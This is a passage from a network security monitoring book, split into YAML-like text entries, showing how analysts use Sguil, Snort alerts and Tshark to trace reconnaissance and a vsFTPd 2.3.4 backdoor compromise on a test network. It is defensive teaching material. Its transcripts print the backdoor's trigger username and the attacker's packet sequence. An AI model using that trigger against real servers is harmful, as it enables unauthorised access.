- en: a powerful framework that can empower CIRTs and frustrate adversaries.
  prefs: []
  type: TYPE_NORMAL
- en: In order to be successful, CIRTs must classify and count all incidents they
  prefs: []
  type: TYPE_NORMAL
- en: detect, as well as measure the time from incident detection to containment.
  prefs: []
  type: TYPE_NORMAL
- en: They should develop time-sensitive processes for managing incidents, and
  prefs: []
  type: TYPE_NORMAL
- en: structure themselves to offer a mix of detection, intelligence, and support
  prefs: []
  type: TYPE_NORMAL
- en: functions.
  prefs: []
  type: TYPE_NORMAL
- en: With this understanding in place, we now turn to a couple of case stud-
  prefs: []
  type: TYPE_NORMAL
- en: ies showing NSM operations in action.
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **205**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: '**S e r v e r- S i D e c o M P r o M i S e**'
  prefs: []
  type: TYPE_NORMAL
- en: This is the moment of truth. Now you are
  prefs: []
  type: TYPE_NORMAL
- en: ready to see NSM in action. In this chapter,
  prefs: []
  type: TYPE_NORMAL
- en: we’ll put the theory, tools, and process to
  prefs: []
  type: TYPE_NORMAL
- en: work in a simple compromise scenario. So far,
  prefs: []
  type: TYPE_NORMAL
- en: you’ve implemented a sensor using SO and collected
  prefs: []
  type: TYPE_NORMAL
- en: some NSM data. Now you plan to analyze the avail-
  prefs: []
  type: TYPE_NORMAL
- en: able evidence.
  prefs: []
  type: TYPE_NORMAL
- en: This chapter demonstrates a server-side compromise—one of the major
  prefs: []
  type: TYPE_NORMAL
- en: categories of malicious network activity you’re likely to encounter. The next
  prefs: []
  type: TYPE_NORMAL
- en: chapter demonstrates a client-side compromise, which may be even more
  prefs: []
  type: TYPE_NORMAL
- en: popular than the server-side variant. We begin with a server-side compro-
  prefs: []
  type: TYPE_NORMAL
- en: mise because it is conceptually easier to understand.
  prefs: []
  type: TYPE_NORMAL
- en: Because this is a book about NSM, in this chapter and Chapter 11 we’ll
  prefs: []
  type: TYPE_NORMAL
- en: look at intrusion patterns for two popular network-centric attack types.
  prefs: []
  type: TYPE_NORMAL
- en: For example, I won’t discuss inserting a malicious USB drive into a laptop,
  prefs: []
  type: TYPE_NORMAL
- en: or password guessing by a rogue insider sitting at an internal computer
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: terminal. Instead, we’ll focus on attacks across the network. These are *remote*
    attacks, rather than *local* variants requiring interaction with a system that
    is physically or virtually already available to an intruder.
  prefs: []
  type: TYPE_NORMAL
- en: '**Server-side compromise defined**'
  prefs: []
  type: TYPE_NORMAL
- en: A *server-side compromise* involves an intruder deciding to attack an applica-
  prefs: []
  type: TYPE_NORMAL
- en: tion exposed to the Internet. The application could be a web service, a
  prefs: []
  type: TYPE_NORMAL
- en: file transfer protocol service, a database, or any other software listening
    to
  prefs: []
  type: TYPE_NORMAL
- en: Internet traffic. Figure 10-1 shows a generic attack pattern for a server-side
  prefs: []
  type: TYPE_NORMAL
- en: compromise.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder initiates attack against exposed,
  prefs: []
  type: TYPE_NORMAL
- en: vulnerable application on victim system.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Attack method exploits vulnerable application
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  prefs: []
  type: TYPE_NORMAL
- en: on victim system to execute code or commands.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: '3\. Malicious code interacts with intruder using one of three ways:'
  prefs: []
  type: TYPE_NORMAL
- en: a. Intruder repurposes existing connection to victim application
  prefs: []
  type: TYPE_NORMAL
- en: OR
  prefs: []
  type: TYPE_NORMAL
- en: b. Intruder initiates new connection to backdoor created by
  prefs: []
  type: TYPE_NORMAL
- en: malicious code
  prefs: []
  type: TYPE_NORMAL
- en: OR
  prefs: []
  type: TYPE_NORMAL
- en: c. Malicious code causes victim to reach back to intruder
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-1: Server-side compromise at ack pat ern*'
  prefs: []
  type: TYPE_NORMAL
- en: The intruder will reach out to the application to learn more about
  prefs: []
  type: TYPE_NORMAL
- en: it. This act of reconnaissance qualifies as a Cat 6 incident, as discussed
  prefs: []
  type: TYPE_NORMAL
- en: in Chapter 9 (see Figure 9-5). If the intruder tries to take advantage of
  prefs: []
  type: TYPE_NORMAL
- en: any vulnerabilities in its code, that act qualifies as a Cat 3 incident. If
    the
  prefs: []
  type: TYPE_NORMAL
- en: intruder manages to get the application to do his evil bidding, the attack
  prefs: []
  type: TYPE_NORMAL
- en: is successful and *exploitation* has occurred. According to the categories out-
  prefs: []
  type: TYPE_NORMAL
- en: lined in Figure 9-5, we now have a Cat 1 intrusion on our hands. After the
  prefs: []
  type: TYPE_NORMAL
- en: intruder executes malicious code or commands on the victim computer, he
  prefs: []
  type: TYPE_NORMAL
- en: opens one or more channels to further enhance his control of the system.
  prefs: []
  type: TYPE_NORMAL
- en: This is called a *command-and-control (C2)* channel. Establishing a C2 channel
  prefs: []
  type: TYPE_NORMAL
- en: qualifies the activity as a Breach 3 intrusion.
  prefs: []
  type: TYPE_NORMAL
- en: Once the intruder establishes C2 with the victim, he can execute the
  prefs: []
  type: TYPE_NORMAL
- en: rest of his game plan. Perhaps he wants to steal information from this first
  prefs: []
  type: TYPE_NORMAL
- en: victim. Perhaps he wants to pivot from the first victim to another computer
  prefs: []
  type: TYPE_NORMAL
- en: '**208** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: or application inside the company. Maybe he wants to bounce through this victim
    and attack an entirely different organization, using the newly compromised victim
    as a *hop,* or jumping-off point.
  prefs: []
  type: TYPE_NORMAL
- en: Regardless of what the attacker chooses to do next, the goals of the
  prefs: []
  type: TYPE_NORMAL
- en: CIRT at this point are to quickly scope the extent of the intrusion and to
  prefs: []
  type: TYPE_NORMAL
- en: take rapid containment actions to mitigate risk of data loss, alteration, and
  prefs: []
  type: TYPE_NORMAL
- en: degradation.
  prefs: []
  type: TYPE_NORMAL
- en: '**Server-side compromise in action**'
  prefs: []
  type: TYPE_NORMAL
- en: For this chapter’s example, we’ll walk through a server-side compromise
  prefs: []
  type: TYPE_NORMAL
- en: that occurs when an intruder attacks an exposed service on a vulnerable
  prefs: []
  type: TYPE_NORMAL
- en: computer that is monitored by a stand-alone NSM platform running SO.
  prefs: []
  type: TYPE_NORMAL
- en: We’ll examine what a sample intrusion looks like in NSM data, and figure
  prefs: []
  type: TYPE_NORMAL
- en: out how to make sense of that data.
  prefs: []
  type: TYPE_NORMAL
- en: The target network is a new segment on the Vivian’s Pets network, as
  prefs: []
  type: TYPE_NORMAL
- en: shown in Figure 10-2\. The network consists of a server (192.168.3.5), a desk-
  prefs: []
  type: TYPE_NORMAL
- en: top (192.168.3.13), and supporting network equipment. An NSM sensor
  prefs: []
  type: TYPE_NORMAL
- en: watches the uplink to the Internet through a network tap. The company
  prefs: []
  type: TYPE_NORMAL
- en: CIRT members created what they believed was an isolated test network
  prefs: []
  type: TYPE_NORMAL
- en: with a few computers in order to learn more about security. Unfortunately,
  prefs: []
  type: TYPE_NORMAL
- en: they failed to effectively protect the systems on this segment. In the process
  prefs: []
  type: TYPE_NORMAL
- en: of trying to learn more about computer security, they may have exposed the
  prefs: []
  type: TYPE_NORMAL
- en: company to additional risk.
  prefs: []
  type: TYPE_NORMAL
- en: Internet
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  prefs: []
  type: TYPE_NORMAL
- en: Test
  prefs: []
  type: TYPE_NORMAL
- en: Network
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  prefs: []
  type: TYPE_NORMAL
- en: Server
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: Desktop
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-2: Test network on Vivian’s Pets network*'
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **209**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 124](index-244_1.png)'
  prefs: []
  type: TYPE_IMG
- en: In this configuration, the NSM platform will see traffic to and from the
  prefs: []
  type: TYPE_NORMAL
- en: test network. For simplicity, I’ve configured the network so that NAT is not
  prefs: []
  type: TYPE_NORMAL
- en: required, and when you see the test network interacting with computers out-
  prefs: []
  type: TYPE_NORMAL
- en: side the Vivian’s Pets network, you should assume that no translation takes
  prefs: []
  type: TYPE_NORMAL
- en: place. (In the real world, you would likely need to deal with some degree of
  prefs: []
  type: TYPE_NORMAL
- en: obfuscation due to NAT issues, as described in Chapter 2.)
  prefs: []
  type: TYPE_NORMAL
- en: '***Starting with Sguil***'
  prefs: []
  type: TYPE_NORMAL
- en: The work of the Vivian’s Pets CIRT begins with a visit to its Sguil console,
  prefs: []
  type: TYPE_NORMAL
- en: which the team uses as its primary interface to NSM data. Recall that Sguil
  prefs: []
  type: TYPE_NORMAL
- en: allows analysts to investigate alerts by viewing session and full content data,
  prefs: []
  type: TYPE_NORMAL
- en: as well as some transaction data.
  prefs: []
  type: TYPE_NORMAL
- en: One day, an analyst logs in to the Sguil console for the NSM platform
  prefs: []
  type: TYPE_NORMAL
- en: shown in Figure 10-2 and sees the alerts shown in Figure 10-3\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-3: Sguil console for Vivian’s Pets*'
  prefs: []
  type: TYPE_NORMAL
- en: The default Sguil console displays alert data. The alerts shown here
  prefs: []
  type: TYPE_NORMAL
- en: are generated primarily by the PRADS passive asset detection system
  prefs: []
  type: TYPE_NORMAL
- en: (with entries prefaced by PADS) and by the Snort IDS engine (with entries
  prefs: []
  type: TYPE_NORMAL
- en: prefaced by GPL or ET).
  prefs: []
  type: TYPE_NORMAL
- en: We see a slew of PRADS events with source IP address 203.0.113.10\.
  prefs: []
  type: TYPE_NORMAL
- en: This IP address represents a remote intruder. (The 203.0.113.0/24 net
  prefs: []
  type: TYPE_NORMAL
- en: block is reserved for documentation purposes per RFC 5735, along with
  prefs: []
  type: TYPE_NORMAL
- en: the 198.51.100.0/24 net block we saw in Chapter 2.)
  prefs: []
  type: TYPE_NORMAL
- en: '**210** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 125](index-245_1.png)'
  prefs: []
  type: TYPE_IMG
- en: The events starting with Alert ID 4.75 and ending with 4.87 represent
  prefs: []
  type: TYPE_NORMAL
- en: 'PRADS reporting the discovery of new services on two computers: 192.168.3.5'
  prefs: []
  type: TYPE_NORMAL
- en: and 192.168.3.13, the two systems in the test network segment shown in
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-2\. As PRADS learns about services by watching computers interact
  prefs: []
  type: TYPE_NORMAL
- en: with them, it generates these sorts of alerts. Here, the result is a handy sum-
  prefs: []
  type: TYPE_NORMAL
- en: mary of at least some of the services that the remote intruder at 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: appears to have discovered. Starting at 2013-03-09 21:32:07, the timestamp
  prefs: []
  type: TYPE_NORMAL
- en: on the first alert with 203.0.113.10 as the source IP address, we see that
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10 conducted network reconnaissance against at least two com-
  prefs: []
  type: TYPE_NORMAL
- en: puters in the test network.
  prefs: []
  type: TYPE_NORMAL
- en: What about the other activity? The first alert, with source IP address
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.130, appears to be PRADS reporting the discovery of a DNS server
  prefs: []
  type: TYPE_NORMAL
- en: on 192.168.3.1\. That is not unusual. The alerts after the PRADS events from
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10 appear to be more worrying.
  prefs: []
  type: TYPE_NORMAL
- en: Before digging into these alerts, let’s take a slight detour to validate our
  prefs: []
  type: TYPE_NORMAL
- en: hypothesis that 203.0.113.10 conducted network reconnaissance against this
  prefs: []
  type: TYPE_NORMAL
- en: test network.
  prefs: []
  type: TYPE_NORMAL
- en: '***Querying Sguil for Session Data***'
  prefs: []
  type: TYPE_NORMAL
- en: To determine just what network reconnaissance 203.0.113.10 performed,
  prefs: []
  type: TYPE_NORMAL
- en: we can query Sguil for session data to or from 203.0.113.10\. Because of the
  prefs: []
  type: TYPE_NORMAL
- en: number of target services in the Sguil console, we can guess that 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: scanned many TCP ports on the two target computers. Therefore, when we
  prefs: []
  type: TYPE_NORMAL
- en: query for session data in Sguil, we’ll manually adjust the session limit count
  prefs: []
  type: TYPE_NORMAL
- en: upward from 1000 results to 10,000 results.
  prefs: []
  type: TYPE_NORMAL
- en: To perform the session data query, we highlight one of the alert records
  prefs: []
  type: TYPE_NORMAL
- en: showing 203.0.113.10 as the source IP address, and then select **Advanced**
  prefs: []
  type: TYPE_NORMAL
- en: '**Query**4**Query Sancp Table**4**Query SrcIP**, as shown in Figure 10-4\.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-4: Querying for session data using the source IP address*'
  prefs: []
  type: TYPE_NORMAL
- en: The resulting Query Builder window offers two Where Clause boxes for
  prefs: []
  type: TYPE_NORMAL
- en: us to edit. We need to make sure that the default start times for the session
  prefs: []
  type: TYPE_NORMAL
- en: records will capture the data we care about. In this case, the activity began
  prefs: []
  type: TYPE_NORMAL
- en: on March 9, 2013, at 21:32:07 UTC, so we modify the Where Clause boxes
  prefs: []
  type: TYPE_NORMAL
- en: to search for the proper time, as shown in Listing 10-1\.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **211**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 126](index-246_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'WHERE sancp.start_time > ''2013-03-09'' AND sancp.src_ip = INET_ATON(''203.0.113.10'')
    *Listing 10-1: Search syntax for session data involving 203.0.113.10*'
  prefs: []
  type: TYPE_NORMAL
- en: After also adjusting the LIMIT field in the Query Builder window from
  prefs: []
  type: TYPE_NORMAL
- en: 1000 to 10,000 results, we choose **Submit** to run the query. The answer from
  prefs: []
  type: TYPE_NORMAL
- en: the Sguil database produces 2104 records, beginning with those shown in
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-5\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-5: Session data to or from 203.0.113.10 showing reconnaissance phases
    1 and 2, and the beginning of phase 3*'
  prefs: []
  type: TYPE_NORMAL
- en: The activity from 203.0.113.10 begins at 2013-03-09 21:31:44\. We can
  prefs: []
  type: TYPE_NORMAL
- en: break the sequence of events into several distinct elements.
  prefs: []
  type: TYPE_NORMAL
- en: • First, the attacker uses ICMP (IP Protocol 1) to perform reconnaissance
  prefs: []
  type: TYPE_NORMAL
- en: against a subset of systems on the 192.168.3.0/24 network. We can’t be
  prefs: []
  type: TYPE_NORMAL
- en: sure, but perhaps the intruder did earlier reconnaissance (not recorded
  prefs: []
  type: TYPE_NORMAL
- en: here) that led him to try to ping only these six systems. The ICMP scan
  prefs: []
  type: TYPE_NORMAL
- en: is phase 1\. He begins phase 2 at 2013-03-09 21:31:45, consisting of scans
  prefs: []
  type: TYPE_NORMAL
- en: against ports 80 and 443 TCP on several systems.
  prefs: []
  type: TYPE_NORMAL
- en: '**212** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 127](index-247_1.png)'
  prefs: []
  type: TYPE_IMG
- en: • Phase 3 begins at 2013-03-09 21:32:01 with scans against a wide variety
  prefs: []
  type: TYPE_NORMAL
- en: of TCP ports. In phase 4, also at the same timestamp, we see smaller
  prefs: []
  type: TYPE_NORMAL
- en: scans of what are likely open ports. (The activity is so fast that it appears
  prefs: []
  type: TYPE_NORMAL
- en: to all start in the same second of time.)
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-6 shows the end of phase 3 and the beginning of phase 4\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-6: Reconnaissance phase 3 ends and phase 4 begins.*'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-7 shows that phase 4 ends at 2013-03-09 21:32:06 with the
  prefs: []
  type: TYPE_NORMAL
- en: intruder changing tactics again. At 2013-03-09 21:32:07, he conducts addi-
  prefs: []
  type: TYPE_NORMAL
- en: tional reconnaissance, beginning phase 5—interrogating active services.
  prefs: []
  type: TYPE_NORMAL
- en: We see him sending and receiving higher amounts of data as shown in the
  prefs: []
  type: TYPE_NORMAL
- en: far-right columns in Figure 10-7\. (Higher counts of data sent between two
  prefs: []
  type: TYPE_NORMAL
- en: computers typically signify a more “meaningful” conversation. Low counts
  prefs: []
  type: TYPE_NORMAL
- en: are usually just exchanges of state information for the TCP three-way hand-
  prefs: []
  type: TYPE_NORMAL
- en: shake, for example.)
  prefs: []
  type: TYPE_NORMAL
- en: The four right-most columns in Figures 10-5 through 10-8 show packets
  prefs: []
  type: TYPE_NORMAL
- en: and data sent by the source, and packets and data sent by the destination.
  prefs: []
  type: TYPE_NORMAL
- en: The intruder is likely profiling the target active services using a recon-
  prefs: []
  type: TYPE_NORMAL
- en: naissance tool to gather information about the services available. The
  prefs: []
  type: TYPE_NORMAL
- en: intruder compares information derived from the scan to find available
  prefs: []
  type: TYPE_NORMAL
- en: attack methods, and if he finds one that takes advantage of an exposed
  prefs: []
  type: TYPE_NORMAL
- en: vulnerability, he will exploit that weakness.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **213**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 128](index-248_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 10-7: Reconnaissance phase 4 ends and phase 5 begins.*'
  prefs: []
  type: TYPE_NORMAL
- en: The final phase of the activity begins at 2013-03-09 21:38:38, as shown
  prefs: []
  type: TYPE_NORMAL
- en: in Figure 10-8\. The intruder’s reconnaissance tool has finished gathering
  prefs: []
  type: TYPE_NORMAL
- en: information, and he pauses to review his results. After discovering a weak-
  prefs: []
  type: TYPE_NORMAL
- en: ness, he appears to exploit it, although that may not be obvious from the ses-
  prefs: []
  type: TYPE_NORMAL
- en: sion data shown. (We’ll examine this alert data on the original Sguil console
  prefs: []
  type: TYPE_NORMAL
- en: for clarification.) For now, review the session records starting at 21:38:38\.
  prefs: []
  type: TYPE_NORMAL
- en: The sessions beginning at 21:38:38 look very different from the earlier
  prefs: []
  type: TYPE_NORMAL
- en: ones. One of the sessions shows the transfer of a lot of data, involving port
    6200
  prefs: []
  type: TYPE_NORMAL
- en: TCP. Another session (records showing activity involving port 21 TCP) shows
  prefs: []
  type: TYPE_NORMAL
- en: an active FTP command channel. Having seen five phases of reconnaissance
  prefs: []
  type: TYPE_NORMAL
- en: from 203.0.113.10, followed by focused activity involving ports 21 and 6200
  prefs: []
  type: TYPE_NORMAL
- en: TCP, we should take a close look at these last connections.
  prefs: []
  type: TYPE_NORMAL
- en: '***Returning to Alert Data***'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s examine two alerts in the Sguil console. As shown in Figure 10-9, we
  prefs: []
  type: TYPE_NORMAL
- en: see two worrisome alerts titled GPL ATTACK_RESPONSE id check returned root
  prefs: []
  type: TYPE_NORMAL
- en: and ET EXPLOIT VSFTPD Backdoor User Login Smiley. There is also an odd alert
  prefs: []
  type: TYPE_NORMAL
- en: with the title PADS New Asset - sql MySQL 3.0.20-0.1ubuntu1, and then two
  prefs: []
  type: TYPE_NORMAL
- en: ICMP alerts.
  prefs: []
  type: TYPE_NORMAL
- en: '**214** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 129](index-249_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 130](index-249_2.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 10-8: Reconnaissance phase 5 ends, and the intruder at acks a victim.*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-9: Snort alert data fol owing reconnaissance alerts*'
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **215**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'I’ve highlighted the record for the ET EXPLOIT alert because it appears to
    be the most straightforward one, and it uses a fairly familiar protocol: FTP.'
  prefs: []
  type: TYPE_NORMAL
- en: Sguil’s Show Packet Data option reveals that the username supplied to the
  prefs: []
  type: TYPE_NORMAL
- en: FTP server is 0M:), followed by a carriage return (0D) and line feed (0A). (FTP
  prefs: []
  type: TYPE_NORMAL
- en: ends commands with these characters, meaning they were transmitted by
  prefs: []
  type: TYPE_NORMAL
- en: the FTP client when the user (or attack tool) entered the FTP username.)
  prefs: []
  type: TYPE_NORMAL
- en: We can try to generate a transcript for this event by right-clicking the
  prefs: []
  type: TYPE_NORMAL
- en: Alert ID field and selecting **Transcript**. The result is shown in Listing
    10-2\.
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1-1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-09 21:38:38'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1-1_6011'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 203.0.113.10u (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 192.168.3.5x (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 50376'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 21w'
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 203.0.113.10:50376 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 1 hrs) OS Fingerprint: -> 192.168.3.5:21 (link: ethernet/modem)'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 220 (vsFTPd 2.3.4)v'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: USER 0M:)y'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 331 Please specify the password.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: PASS azzz'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 421 Timeout.{'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-2: Transcript of ET EXPLOIT Alert*'
  prefs: []
  type: TYPE_NORMAL
- en: This transcript shows 203.0.113.10 u logging in to the FTP server v on
  prefs: []
  type: TYPE_NORMAL
- en: port 21 TCP w on 192.168.3.5 x. The username is 0M:) y, as noted earlier
  prefs: []
  type: TYPE_NORMAL
- en: by the Snort alert. The client provides a password of azz z, but no commu-
  prefs: []
  type: TYPE_NORMAL
- en: nication takes place {. What happened next, and what about the connection
  prefs: []
  type: TYPE_NORMAL
- en: involving port 6200 TCP?
  prefs: []
  type: TYPE_NORMAL
- en: '***Reviewing Full Content Data with Tshark***'
  prefs: []
  type: TYPE_NORMAL
- en: In situations like this, I recommend examining the original traffic as
  prefs: []
  type: TYPE_NORMAL
- en: recorded by the full content data. We’re interested in traffic occurring at
  prefs: []
  type: TYPE_NORMAL
- en: the 2013-03-09 21:38:38 timestamp involving port 21 or 6200 TCP. We can
  prefs: []
  type: TYPE_NORMAL
- en: read the full content data by looking in the appropriate directory on the
  prefs: []
  type: TYPE_NORMAL
- en: sensor named sovm and by watching the eth1 interface. We run the ls com-
  prefs: []
  type: TYPE_NORMAL
- en: mand to see the name of the full content file available for review, as shown
  prefs: []
  type: TYPE_NORMAL
- en: in Listing 10-3\.
  prefs: []
  type: TYPE_NORMAL
- en: '**216** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: $ **cd /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-09**
  prefs: []
  type: TYPE_NORMAL
- en: $ **ls**
  prefs: []
  type: TYPE_NORMAL
- en: snort.log.1362864654
  prefs: []
  type: TYPE_NORMAL
- en: $ **tshark -n -t ad -r snort.log.1362864654 tcp.port==21 or tcp.port==6200**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-3: Finding the full content data and running Tshark*'
  prefs: []
  type: TYPE_NORMAL
- en: We use Tshark because, by default, it displays more protocol-level details,
  prefs: []
  type: TYPE_NORMAL
- en: making it easier to follow what’s happening. Now we’ll look at each relevant
  prefs: []
  type: TYPE_NORMAL
- en: part of these details, section by section. (We begin by ignoring traffic asso-
  prefs: []
  type: TYPE_NORMAL
- en: ciated with reconnaissance.)
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-4 shows the first two packets of interest.
  prefs: []
  type: TYPE_NORMAL
- en: 6589 2013-03-09 21:38:38.159255 203.0.113.10u -> 192.168.3.5w
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 40206 > 6200v [SYN] Seq=0 Win=14600 Len=0 MSS=1460
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=695390 TSecr=0 WS=16
  prefs: []
  type: TYPE_NORMAL
- en: 6590 2013-03-09 21:38:38.159451 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: TCP 60 6200 > 40206 [RST, ACK]x Seq=1 Ack=1 Win=0 Len=0
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-4: 203.0.113.10 tries to connect to port 6200 TCP on 192.168.3.5
    but fails.*'
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 10-4, 203.0.113.10 u is trying to connect to port 6200 TCP v
  prefs: []
  type: TYPE_NORMAL
- en: on 192.168.3.5 w, but the connection fails because port 6200 TCP is not lis-
  prefs: []
  type: TYPE_NORMAL
- en: tening. It replies with RST, ACK x.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-5 shows what happens next.
  prefs: []
  type: TYPE_NORMAL
- en: 6591 2013-03-09 21:38:38.160692 203.0.113.10u -> 192.168.3.5w
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 50376 > 21v [SYN] Seq=0 Win=14600 Len=0 MSS=1460
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=695390 TSecr=0 WS=16
  prefs: []
  type: TYPE_NORMAL
- en: 6592 2013-03-09 21:38:38.160702 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 21 > 50376 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=276175 TSecr=695390 WS=32
  prefs: []
  type: TYPE_NORMAL
- en: 6593 2013-03-09 21:38:38.161131 203.0.113.10 -> 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 50376 > 21 [ACK] Seq=1 Ack=1 Win=14608 Len=0 TSval=695390 TSecr=276175
  prefs: []
  type: TYPE_NORMAL
- en: 6594 2013-03-09 21:38:38.162679 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 86 Response: 220 (vsFTPd 2.3.4)'
  prefs: []
  type: TYPE_NORMAL
- en: 6595 2013-03-09 21:38:38.163164 203.0.113.10 -> 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 50376 > 21 [ACK] Seq=1 Ack=21 Win=14608 Len=0 TSval=695391 TSecr=276175
  prefs: []
  type: TYPE_NORMAL
- en: 6596 2013-03-09 21:38:38.164876 203.0.113.10 -> 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 77 Request: USER 0M:)x'
  prefs: []
  type: TYPE_NORMAL
- en: 6597 2013-03-09 21:38:38.164886 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 21 > 50376 [ACK] Seq=21 Ack=12 Win=5792 Len=0 TSval=276175 TSecr=695391
  prefs: []
  type: TYPE_NORMAL
- en: 6598 2013-03-09 21:38:38.164888 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 100 Response: 331 Please specify the password.'
  prefs: []
  type: TYPE_NORMAL
- en: 6599 2013-03-09 21:38:38.166318 203.0.113.10 -> 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
